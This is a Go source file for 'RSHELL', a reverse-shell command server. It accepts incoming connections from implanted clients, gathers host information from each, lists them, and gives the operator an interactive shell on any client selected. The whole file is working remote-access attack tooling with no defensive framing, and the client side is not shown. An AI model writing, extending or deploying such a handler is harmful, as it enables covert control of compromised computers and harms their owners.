package main

import (
	"fmt"
	"net"
	"os"
	"io"
	"bufio"
	"strings"
	"sync"
	"strconv"
	"time"
	"os/signal"
)

type Client struct {
	conn net.Conn
	info string
	closed bool
}

var clients []Client = []Client{}
var clientsNum = 0
var curClient = -1					// currently communicating client's ID, -1 means not communicating with shell
var m *sync.Mutex = &sync.Mutex{}	// mutex for accessing clients, clientsNum, and curClient

var listener net.Listener
var quit = false

func readOutput(conn net.Conn) {
	buffer := make([]byte, 4096)
	for {
		n, err := conn.Read(buffer)
		fmt.Print(string(buffer[:n]))
		if err != nil {
			break
		}
	}
}

func startShell(conn net.Conn) {
	// Inform client to spawn shell
	_, err := conn.Write([]byte("STSH"))
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		return
	}

	stdinReader := bufio.NewReader(os.Stdin)
	go readOutput(conn)
	for {
		line, _ := stdinReader.ReadString('\n')
		_, err := conn.Write([]byte(line))
		if err != nil {
			break
		}
	}
}

func manager() {
	// Set signal handler for all handable signals
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, os.Kill)
	go func(c <-chan os.Signal) {
		for {
			<-c 		// block until got SIGINT or SIGKILL
			m.Lock()
			if curClient != -1 {
				clients[curClient].conn.Close()
				fmt.Println("")
			}
			m.Unlock()
		}
	}(c)

	fmt.Println("\033[1;32mRSHELL \033[1;37mby kilo\033[0m. Type 'h' for more information.")
	stdinReader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("$ ")
		command, err := stdinReader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				fmt.Fprintf(os.Stderr, err.Error())
			}
			break
		}
		trim := strings.Trim(command, " \t\r\n")

		if trim == "l" {
			m.Lock()
			for i, client := range clients {
				if !client.closed {
					fmt.Printf(" [%d] %s\t%s\n", i + 1, client.conn.RemoteAddr(), client.info)
				}
			}
			m.Unlock()
		} else if trim == "h" {
			help()
		} else if trim == "q" {
			quit = true
			listener.Close()
			break
		} else if i, err := strconv.Atoi(trim); err == nil {
			var conn net.Conn
			if ((i - 1) < clientsNum) && (i - 1) >= 0 && !clients[i - 1].closed {
				m.Lock()
				curClient = i - 1
				conn = clients[curClient].conn
				m.Unlock()
			} else {
				continue
			}
			startShell(conn)
			m.Lock()
			clients[curClient].conn.Close()		// Close client connection after shell complete
			clients[curClient].closed = true 	// Client will start a new connection
			curClient = -1
			m.Unlock()
		} else {
			fmt.Println("???")
		}
	}
}

func main() {
	slistener, err := net.Listen("tcp", "127.0.0.1:12341")
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		return
	}
	listener = slistener
	defer listener.Close()
	fmt.Printf("Listening on %s ...\n", listener.Addr().String())

	go manager()

	for {
		conn, err := listener.Accept()
		if err != nil {
			if quit {				// Listener close by command 'q'
				fmt.Println("bye")
			} else {
				fmt.Fprintln(os.Stderr, err.Error())
			}
			return
		}

		// Get client information
		_, err = conn.Write([]byte("INFO"))
		if err != nil {
			conn.Close()
			continue
		}
		buffer := make([]byte, 4 + 1 + 255)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))

		// This line will block until buffer full or timeout after 3 secconds, prevent weird message
		_, err = io.ReadFull(conn, buffer)
		if err != nil || (err == nil && string(buffer[:4]) != "INFO") {
			conn.Close()
			continue
		}
		conn.SetReadDeadline(time.Time{})	// disable timeout

		m.Lock()
		clients = append(clients, Client{conn: conn, info: string(buffer[5:5 + int(buffer[4])]), closed: false})
		clientsNum++
		m.Unlock()
	}
}